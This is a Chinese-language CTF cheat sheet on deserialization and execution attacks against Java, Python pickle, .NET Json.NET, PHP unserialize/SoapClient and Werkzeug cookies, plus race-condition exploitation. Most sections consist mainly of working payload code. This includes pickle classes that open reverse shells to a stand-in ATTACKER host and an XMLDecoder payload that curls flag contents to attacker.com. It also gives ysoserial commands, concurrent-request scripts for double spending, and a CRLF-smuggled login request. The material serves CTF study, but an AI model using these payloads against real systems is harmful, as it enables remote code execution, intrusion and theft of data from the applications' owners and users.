# CTF Web - 反序列化与执行类攻击

核心注入攻击（SQLi、SSTI、SSRF、XXE、命令注入）见 [server-side.md](server-side.md)。

## 目录
- [Java 反序列化（ysoserial）](#java-反序列化ysoserial)
- [Python Pickle 反序列化](#python-pickle-反序列化)
- [条件竞争（Time-of-Check to Time-of-Use）](#条件竞争time-of-check-to-time-of-use)
- [通过剥离 STOP 操作码实现 Pickle 链式执行（VolgaCTF 2013）](#通过剥离-stop-操作码实现-pickle-链式执行volgactf-2013)
- [Java XMLDecoder 反序列化 RCE（HackIM 2016）](#java-xmldecoder-反序列化-rcehackim-2016)
- [.NET JSON TypeNameHandling 反序列化（DefCamp 2017）](#net-json-typenamehandling-反序列化defcamp-2017)
- [通过过滤词扩展操纵 PHP 序列化长度（0CTF 2016）](#通过过滤词扩展操纵-php-序列化长度0ctf-2016)
- [经 __call() 反序列化的 PHP SoapClient CRLF SSRF（N1CTF 2018）](#经-__call-反序列化的-php-soapclient-crlf-ssrfn1ctf-2018)
- [Java TiedMapEntry + LazyMap + 反射修补 HashMap（Trend Micro 2018）](#java-tiedmapentry--lazymap--反射修补-hashmaptrend-micro-2018)
- [SECRET_KEY 泄露后的 Werkzeug SecureCookie Pickle RCE（CSAW 2018 Finals）](#secret_key-泄露后的-werkzeug-securecookie-pickle-rcecsaw-2018-finals)
- [PHP unserialize + 双重 URL 编码 curl LFI（FireShell CTF 2019）](#php-unserialize--双重-url-编码-curl-lfifireshell-ctf-2019)
- [ROT13(Base64) 包裹的 Python Pickle RCE（TAMUctf 2019）](#rot13base64-包裹的-python-pickle-rcetamuctf-2019)

---

<a id="java-deserialization-ysoserial"></a>
## Java 反序列化（ysoserial）

**模式：** 对不可信输入调用 `ObjectInputStream.readObject()` 的 Java 应用。序列化 Java 对象可能出现在 Cookie、POST body 或 ViewState 中（base64 编码，以 `rO0AB` 开头，或十六进制 `aced0005`）。

**检测：**
- base64 解码可疑数据块 —— Java 序列化数据以魔数 `AC ED 00 05` 开头
- 在源码中搜索 `ObjectInputStream`、`readObject`、`readUnshared`
- Content-Type 为 `application/x-java-serialized-object`
- Burp 扩展：Java Deserialization Scanner

**关键点：** 反序列化会触发 classpath 上各类 `readObject()` 方法中的代码。若存在"gadget 链"（一串类的 `readObject` → 方法调用最终通向任意执行），攻击者无需上传代码即可 RCE。

```bash
# Generate payloads with ysoserial
java -jar ysoserial.jar CommonsCollections1 'id' | base64
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser

# Common gadget chains (try in order):
# CommonsCollections1-7 (Apache Commons Collections)
# CommonsBeanutils1 (Apache Commons BeanUtils)
# URLDNS (no execution — DNS callback for blind detection)
# JRMPClient (triggers JRMP connection)
# Spring1/Spring2 (Spring Framework)

# Blind detection via DNS callback (no RCE needed):
java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64

# Send payload
curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
  --data-binary @payload.ser
```

**绕过过滤：**
- 若 `ObjectInputStream` 子类对特定类做黑名单，换其他 gadget 链
- `ysoserial-modified` 与 `GadgetProbe` 可枚举可用的 gadget 类
- JNDI 注入（Java Naming and Directory Interface）：`java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI 服务
- Java 17+（模块系统限制）时：寻找应用自有 gadget，或转打 Jackson/Fastjson 反序列化

---

<a id="python-pickle-deserialization"></a>
## Python Pickle 反序列化

**模式：** 用 `pickle.loads()`、`pickle.load()` 或 `shelve` 反序列化不可信数据的 Python 应用。常见于 Flask/Django session cookie、缓存对象、ML 模型文件（`.pkl`）、Redis 中存的对象。

**检测：**
- base64 数据块中含 `\x80\x04\x95`（pickle protocol 4）或 `\x80\x05\x95`（protocol 5）
- 源码中：`pickle.loads()`、`pickle.load()`、`_pickle`、`shelve.open()`、`joblib.load()`、`torch.load()`
- Flask session 使用 `pickle` 序列化器（而非默认 `json`）

**关键点：** Python 的 `pickle.loads()` 会对反序列化对象调用 `__reduce__()`，返回 `(os.system, ('command',))` 即立刻 RCE。对不可信 pickle 数据而言，**没有**安全的反序列化方式。

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# For reverse shell:
class RevShell:
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))

# Using exec for multi-line payloads:
class ExecRCE:
    def __reduce__(self):
        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
```

**绕过受限 unpickler：**
- `RestrictedUnpickler` 可能只允许特定模块 —— 通过允许的类做链式调用
- 若允许 `builtins`：`(__builtins__.__import__, ('os',))` 再接 `.system()`
- YAML 反序列化（`yaml.load()` 且未用 `Loader=SafeLoader`）也能经 `!!python/object/apply:os.system` 达到类似 RCE
- NumPy 的 `.npy`/`.npz`：`numpy.load(allow_pickle=True)` 会触发 pickle

---

<a id="race-conditions-time-of-check-to-time-of-use"></a>
## 条件竞争（Time-of-Check to Time-of-Use）

**模式：** 服务端先检查条件（余额、注册唯一性、优惠券有效性），再分步执行操作。检查与操作之间的并发请求可绕过校验。

**关键点：** 同时发送完全相同的请求。服务端为所有请求读到"修改前"状态，然后全部应用变更 —— 每个请求都看到了修改前的状态。

```python
import asyncio, aiohttp

async def race(url, data, headers, n=20):
    """Send n identical requests simultaneously"""
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

asyncio.run(race('http://target/api/transfer',
    {'to': 'attacker', 'amount': 1000},
    {'Cookie': 'session=...'},
    n=50))
```

**CTF 中常见的竞争目标：**
- **双重花费/余额绕过：** 转账或下单接口检查 `if balance >= amount` → 并发发 50 笔，全部看到原始余额
- **优惠券/兑换码复用：** 一次性码先校验后标记已用 → 在标记前并发兑换
- **注册唯一性：** `if not user_exists(name)` → 并发注册同名用户，一个覆盖另一个（admin 账号接管）
- **上传与使用：** 上传文件后服务端先校验再移动 → 在上传与校验之间（或校验与删除之间）访问文件

```bash
# Turbo Intruder (Burp) — most reliable for precise timing
# Or use curl with GNU parallel:
seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
```

**源码中的检测点：**
- 非原子的"先读后写"且无锁/事务
- `SELECT ... UPDATE` 未用 `FOR UPDATE` 或可串行化隔离级别
- 文件操作：`if os.path.exists()` 后再 `open()`（经典 TOCTOU）
- Redis 先 `GET` 再 `SET` 且未用 `WATCH`/`MULTI`

---

<a id="pickle-chaining-via-stop-opcode-stripping-volgactf-2013"></a>
## 通过剥离 STOP 操作码实现 Pickle 链式执行（VolgaCTF 2013）

**模式：** 从第一个 payload 剥掉 STOP 操作码（`\x2e`）后拼接第二个 payload，就能在单次 `pickle.loads()` 调用中串起多个 pickle 操作。

**关键点：** pickle 虚拟机会顺序执行指令。去掉第一个序列化对象的 STOP 操作码，反序列化器会继续执行第二个 payload 的 `__reduce__` 调用。配合 `os.dup2()` 把 stdout 重定向到 socket fd，即可在网络环境下捕获 `os.system()` 的输出。

```python
import pickle, os

class Redirect:
    def __reduce__(self):
        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5

class Execute:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# Strip STOP opcode from first payload, concatenate second
payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
```

**使用时机：** 远程 pickle 反序列化且命令输出不回显时。先接 `dup2` 把 stdout/stderr 重定向到 socket，再执行命令。

---

<a id="java-xmldecoder-deserialization-rce-hackim-2016"></a>
## Java XMLDecoder 反序列化 RCE（HackIM 2016）

Java 的 `XMLDecoder` 会根据 XML 输入自动实例化类并调用方法。构造 XML 即可执行任意命令：

```xml
<object class="java.lang.Runtime" method="getRuntime">
  <void method="exec">
    <array class="java.lang.String" length="3">
      <void index="0"><string>/bin/sh</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>curl attacker.com/?c=$(cat /flag)</string></void>
    </array>
  </void>
</object>
```

**关键点：** 与二进制 Java 反序列化不同，XMLDecoder 提供了一条基于文本、无需 gadget 链的 RCE 路径。

---

<a id="net-json-typenamehandling-deserialization-defcamp-2017"></a>
## .NET JSON TypeNameHandling 反序列化（DefCamp 2017）

**模式：** Json.NET（Newtonsoft.Json）配置 `TypeNameHandling.All` 或 `TypeNameHandling.Objects` 时，会依据 `$type` 字段实例化任意类。注入指向已加载程序集中特权类的 `$type` 值，攻击者即可执行任意代码或访问受保护功能。

```csharp
// Vulnerable server-side code:
var settings = new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // UNSAFE: deserializes $type field
};
var obj = JsonConvert.DeserializeObject(userInput, settings);
```

```json
// Basic injection — instantiate a class with a dangerous constructor/property:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd.exe",
      "Arguments": "/c calc.exe"
    }
  }
}
```

```json
// Simpler: inject a custom application class to escalate privileges:
{
  "$type": "MyApp.Models.AdminCommand, MyApp",
  "Action": "ReadFlag",
  "TargetPath": "/flag.txt"
}
```

```python
import requests, json

# Target: endpoint deserializing JSON with TypeNameHandling.All
payload = {
    "$type": "MyApp.Commands.ExecuteCommand, MyApp",
    "Command": "cat /flag"
}

r = requests.post("http://target/api/process",
                  json=payload,
                  headers={"Content-Type": "application/json"})
print(r.text)
```

**用于 RCE 的 gadget 链（ysoserial.net）：**
```bash
# Generate Json.NET payload with ysoserial.net:
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
# Common gadgets: ObjectDataProvider, WindowsIdentity, ActivitySurrogateSelector
```

**检测：** .NET/ASP.NET 应用且使用 JSON 请求。API 响应里出现 `$type`（说明服务端也用 TypeNameHandling 序列化）。错误信息中出现 Newtonsoft.Json 堆栈。

**关键点：** Json.NET 的 `$type` 能实例化已加载程序集中的任意类。任何带危险构造函数、隐式转换或可设置属性且会触发副作用的类都是攻击面。用 `ysoserial.net` 枚举已知 gadget 链。防御：使用 `TypeNameHandling.None`（默认值）并配置自定义 `ISerializationBinder` 白名单。

---

<a id="php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016"></a>
## 通过过滤词扩展操纵 PHP 序列化长度（0CTF 2016）

**模式：** 序列化之后的字符串过滤器把 "where"（5 字符）替换为 "hacker"（6 字符），造成序列化字符串长度不匹配。序列化长度字段写着 N 字节，但扩展后实际字符串更长，PHP 反序列化器会越过预期边界，把攻击者控制的数据当成后续序列化字段解析。

```php
// The target payload to inject as a serialized field:
$payload = '";}s:5:"photo";s:10:"config.php";}';
// Repeat "where" enough times so the expansion (5->6 per word) overflows
// by exactly strlen($payload) bytes:
$_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
```

**原理：**
1. 应用把用户输入序列化成 `s:170:"wherewhere...PAYLOAD";`
2. 过滤器把每个 "where"（5）替换为 "hacker"（6），每处多 1 字节
3. 替换后实际字符串长于序列化长度字段
4. PHP 反序列化器只读 `s:170:` 字节，在字符串中途停下，把注入的 `";}s:5:"photo";s:10:"config.php";}` 当成下一个序列化字段

**关键点：** 序列化之后的任何字符串扩展或收缩都会造成可利用的长度不匹配，进而实现对象注入。留意在 `serialize()` 之后、存储/`unserialize()` 之前施加的敏感词过滤、审查或清洗。

---

<a id="php-soapclient-crlf-ssrf-via-__call-deserialization-n1ctf-2018"></a>
### 经 __call() 反序列化的 PHP SoapClient CRLF SSRF（N1CTF 2018）

**模式：** PHP 反序列化出 `SoapClient` 对象后，对它调用不存在的方法会触发 `__call()` 魔法方法并发出 HTTP 请求。在 `uri` 参数里注入 CRLF，可向 localhost 构造任意 HTTP 请求（SSRF）。于是任何"反序列化汇点 + 方法调用"都能升级为完整的 SSRF 原语。

**原理：**
1. 攻击者构造序列化的 `SoapClient`，其 `uri` 参数注入 CRLF
2. 应用反序列化该对象（经 `unserialize()`、session handler 或其他反序列化汇点）
3. 对反序列化对象调用任意未定义方法时，`__call()` 被触发
4. `SoapClient` 向 `location` 发 HTTP 请求，`uri` 中夹带注入的头和 body

```php
$p = array(
    'uri' => "http://127.0.0.1/\r\nContent-Length:0\r\n\r\nPOST /index.php?action=login HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: PHPSESSID=XXX\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 42\r\n\r\nusername=admin&password=nu1ladmin&code=XXX\r\n\r\nPOST /foo\r\n",
    'location' => 'http://127.0.0.1/'
);
$soap = new SoapClient(null, $p);
// When getcountry() called on deserialized object -> triggers __call() -> sends crafted HTTP
```

```python
import requests

# Generate the serialized SoapClient payload
# The CRLF in uri smuggles a complete second HTTP request
php_serialize_script = '''
<?php
$target = "http://127.0.0.1/";
$post_body = "username=admin&password=nu1ladmin&code=XXX";
$headers = array(
    'X-Forwarded-For: 127.0.0.1',
    'Cookie: PHPSESSID=target_session_id'
);
$payload = array(
    'uri' => "http://127.0.0.1/\\r\\nContent-Length:0\\r\\n\\r\\nPOST /index.php?action=login HTTP/1.1\\r\\nHost: 127.0.0.1\\r\\n" . implode("\\r\\n", $headers) . "\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: " . strlen($post_body) . "\\r\\n\\r\\n" . $post_body . "\\r\\n\\r\\nPOST /foo\\r\\n",
    'location' => $target
);
echo serialize(new SoapClient(null, $payload));
?>
'''

# The serialized payload is then injected into the deserialization sink
# e.g., via session manipulation, cookie injection, or POST parameter
```

**常见触发链：**
```text
unserialize(user_input) → $obj->anyMethod() → SoapClient::__call() → HTTP request
session_start() with custom handler → SoapClient in session → __call() on access
```

**关键点：** PHP SoapClient 的 `__call()` 魔法方法在调用任意未定义方法时发出 HTTP 请求。URI 参数中的 CRLF 注入可夹带完整 HTTP 请求，从而对 localhost 发起已认证的 SSRF。`SoapClient` 是 PHP 内置类、无需额外库，因此与其他 PHP 反序列化载体（session handler、`phar://` 包装器）组合时威力很大。留意任何"对反序列化对象调用方法"的代码路径。

---

<a id="java-tiedmapentry--lazymap--reflection-hashmap-patch-trend-micro-2018"></a>
## Java TiedMapEntry + LazyMap + 反射修补 HashMap（Trend Micro 2018）

**模式：** 自定义 Java gadget 链，在不依赖任何现成 ysoserial gadget 的情况下调用静态方法（`Flag.getFlag()`）。该链用 `TiedMapEntry` 包裹 `LazyMap`，其 factory 为 `ChainedTransformer(ConstantTransformer(Flag.class), InvokerTransformer("getMethod", ...), InvokerTransformer("invoke", ...))`。由于 LazyMap 会在序列化完成前于 `get()` 时求值 factory，payload 必须在构建*之后*再把 TiedMapEntry 偷渡进父 HashMap —— 做法是反射进 `HashMap.table` 直接写入 entry。

```java
// Build the transformer chain (classic Commons Collections)
Transformer[] chain = new Transformer[] {
    new ConstantTransformer(Flag.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getFlag", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
};
Map inner = LazyMap.decorate(new HashMap(), new ChainedTransformer(chain));
TiedMapEntry entry = new TiedMapEntry(inner, "trigger");

// Wrap in HashMap WITHOUT triggering LazyMap resolution:
HashMap<Object, Object> outer = new HashMap<>();
outer.put("placeholder", "x");            // force allocation of table[]
Map.Entry[] table = (Map.Entry[]) Whitebox.getInternalState(outer, "table");
table[0] = new HashMap.Node(0, "payload", entry, null);
Whitebox.setInternalState(outer, "table", table);

// Serialize and send
ByteArrayOutputStream out = new ByteArrayOutputStream();
new ObjectOutputStream(out).writeObject(outer);
byte[] payload = out.toByteArray();
```

**关键点：** Commons Collections 的 `LazyMap` + `ChainedTransformer` 原语能调用任意静态方法，不止 `Runtime.exec`。当 CTF 题添加自己的 `Flag.getFlag()` 辅助方法、指望靠 JVM 访问控制兜底时，同一套用于 RCE 的 gadget 链就能直接调用它。难点在于：构建 HashMap 时若调用 `outer.put(payload, "x")` 会立即解析 LazyMap，把 flag 泄漏给构建进程 —— 要用反射（PowerMock 的 `Whitebox.setInternalState`，或原生 `Field.setAccessible(true)`）在 map 填充完毕后再把 TiedMapEntry 写进 `HashMap.table`。

**参考：** Trend Micro CTF 2018 — Raimund Genes Cup Misc 300，writeup 11293

---

<a id="werkzeug-securecookie-pickle-rce-after-secret_key-leak-csaw-2018-finals"></a>
## SECRET_KEY 泄露后的 Werkzeug SecureCookie Pickle RCE（CSAW 2018 Finals）

**模式：** `werkzeug.contrib.securecookie.SecureCookie` 用 `pickle` 序列化 session 数据。一旦 Flask 的 `SECRET_KEY` 泄露（例如通过 SSRF 读取 `/proc/self/environ`），任何 cookie 都能被正常重签，反序列化时 `__reduce__` gadget 就会触发。

```python
import pickle, subprocess
from werkzeug.contrib.securecookie import SecureCookie

class Pwn:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag.txt'],))

cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
# Set Cookie: session=<cookie> and read the flag from the response
```

**关键点：** 任何把 `pickle` 与 HMAC 签名 cookie 混用的框架，距离 RCE 只差一次 SECRET_KEY 泄露。Flask 默认的 `itsdangerous` 用 JSON，但仍在用 `SecureCookie` 或自定义签名器的老应用依旧带着 pickle。

**参考：** CSAW 2018 Finals — NekoCat，writeups 12130、12144

---

<a id="php-unserialize--double-url-encoding-curl-lfi-fireshell-ctf-2019"></a>
## PHP unserialize + 双重 URL 编码 curl LFI（FireShell CTF 2019）

**模式：** 某 PHP 端点反序列化 `$_GET['gg']`，gadget 的 `__destruct()` 调用 `doit()`，其中会 `curl` `$this->url`。黑名单用 `strpos($this->url, $ext)` 拦截 `.php`/`.txt`/`.html`，但 PHP 在 `unserialize` 之前会先对查询串解码一次 —— 任何双重 URL 编码（如用 `%252e` 表示 `.`）在第一次解码后仍是字面 `%2e`，躲过 `strpos` 检查，随后 curl 再解码一次，文件就被读取了。

```php
class SHITS {
    private $url    = "file:///var/www/html/config.php";
    private $method = "doit";
    private $addr; private $host; private $name;
}
// Replace '.' with '%252e' AFTER serialize(), then fix the string length.
// "file:///var/www/html/config.php" (31) -> "file:///var/www/html/config%252ephp" (35 bytes on the wire,
// 33 chars after the first decode), so set s:33 in the serialized blob.
print str_replace('.', '%252e', urlencode(serialize(new SHITS)));
```
```http
GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7B...s%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22...%7D
```

**关键点：** 当过滤器在 URL 解码*之前*使用 `strpos`/`preg_match`，而下游消费者又解码一次时，双重编码 payload 能绕过基于文本的黑名单。用 PHP `unserialize` 时记住 `s:<len>` 前缀必须与 PHP 第一次 URL 解码*之后*的字节数一致（这里是 33，不是 31 也不是 35），否则对象会静默反序列化失败。

**参考：** FireShell CTF 2019 — Vice，writeup 13221

---

<a id="python-pickle-rce-wrapped-in-rot13base64-tamuctf-2019"></a>
## ROT13(Base64) 包裹的 Python Pickle RCE（TAMUctf 2019）

**模式：** 备份/恢复端点用 `pickle` 往返 Python 对象，但把结果编码为 `rot13(base64(pickle.dumps(obj)))` 以混淆格式。包装层不改变可利用性 —— 发送 `__reduce__` payload 之前把逆变换组合上去即可：

```python
import base64, codecs, pickle, subprocess

def make_backup(obj):
    s = base64.b64encode(pickle.dumps(obj)).decode()
    return codecs.encode(s, 'rot-13')

def parse_backup(blob):
    s = codecs.decode(blob, 'rot-13')
    return pickle.loads(base64.b64decode(s))

class RunBinSh:
    def __reduce__(self):
        return (subprocess.Popen, (('/bin/sh',),))

print(make_backup(RunBinSh()))
# -> tNAwp3IvpUWiL2Im... paste into the "Load your backed up list" prompt
```
把输出送到应用的加载端点；反序列化时 pickle 会实例化 `subprocess.Popen(('/bin/sh',))`，直接拿到 shell。

**关键点：** ROT13、hex、zlib、XOR 这类混淆层不会改变 pickle 的威胁模型 —— 只要在发送前把逆变换组合上去。识别包装方式的办法是做一次往返比对（如本地编码空列表，与服务器输出对照）；任何 1:1 逐字节映射都是替换密码，轻易可逆。

**参考：** TAMUctf 2019 — VeggieTales，writeup 13424

---
